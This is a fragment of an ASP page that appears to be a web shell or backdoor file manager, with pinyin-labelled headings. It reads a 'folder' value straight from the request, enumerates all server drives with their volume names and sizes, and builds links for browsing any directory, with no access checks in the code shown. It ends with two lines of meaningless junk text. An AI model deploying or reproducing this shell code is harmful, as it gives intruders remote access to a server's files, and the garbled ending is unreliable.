<%call copyright
set objFSO=Nothing%>
<%sub header%>
<%
currentfolder=request("folder")
if currentfolder<>"" then
  session("currentfolder")=currentfolder
end if
if right(session("currentfolder"),1)="\" then prefix=left(session("currentfolder"),len(session("currentfolder"))-1) else prefix=session("currentfolder")
%>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr align="center"> 
    <td>
      <table width="100%" border="1" cellspacing="0" cellpadding="4" bordercolorlight="#000066" bordercolordark="#FFFFFF">
        <tr bgcolor="#FFEFDF"> 
          <td bgcolor="#FFEFDF">nindezhu-mulu: <font color=red><a href="<%=scriptname%>?folder=<%=Server.urlencode(strrootfolder)%>"><font color=red><%=strrootfolder%></font></a></font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
            dangqian-weizhi: <a href="<%=scriptname%>?folder=<%=Server.URLEncode(session("currentfolder"))%>"><font color=red><%=session("currentfolder")%></font></a> 
            &nbsp;&nbsp; Disk:  
            <%
			For Each thing in objFSO.Drives
				if thing.DriveLetter<>"A" and thing.DriveLetter<>"B" then
					if thing.isready then
						Response.write "<a href="""&scriptname&"?folder="&thing.DriveLetter&":\"" onmouseout=popout(0) onmouseover=""popup('<table width=160><tr><td width=50>Panfu: </td><td align=center>"&thing.DriveLetter&"</td></tr><tr><td>JuanBiao: </td><td align=center>"&thing.VolumeName&"</td></tr><tr><td>Keyong Kongjian: </td><td align=right>"&FormatNumber(thing.FreeSpace/1024,0,-1)&"KB</td></tr><tr><td>Cipan Rongliang: </td><td align=right>"&FormatNumber(thing.TotalSize/1024,0,-1)&"KB</td></tr><tr><td> File Xitong: </td><td align=center>"&thing.FileSystem&"</td></tr></table>')"">"&thing.DriveLetter&":</a>&nbsp;&nbsp;"
					else
						Response.Write "<a href="""&scriptname&"?folder="&thing.DriveLetter&":\"" onmouseout=popout(0) onmouseover=""popup('Disk Meiyou Zhunbei hao')"">"&thing.DriveLetter&":</a>&nbsp;&nbsp;"
					end if
				end if	
			NEXT
			%>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>
<%end sub%>
<%sub copyright%>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  </tr>
</table>
<%end sub%>
<%function fieldtype(typeid)
select case typeid
	case 130	fieldtype = "file"
	case 2		fieldtype = "int"
	case 3		fieldtype = "long"
	case 7		fieldtype = "date-time"
	case 5		fieldtype = "decimal"
	case 11		fieldtype = "yes/no"
	case 128	fieldtype = "OLE object"
	case else	fieldtype = typeid
end select
end function
function fillbefore(str,prefix,totallen)
str=CStr(str)
if len(str)<totallen then
	for i=1 to totallen-len(str)
		str = prefix & str
	next
end if
fillbefore = str
end function
%>
</html>
jfoeoufeni78655nhg5
jfoeoufeni78655nhg5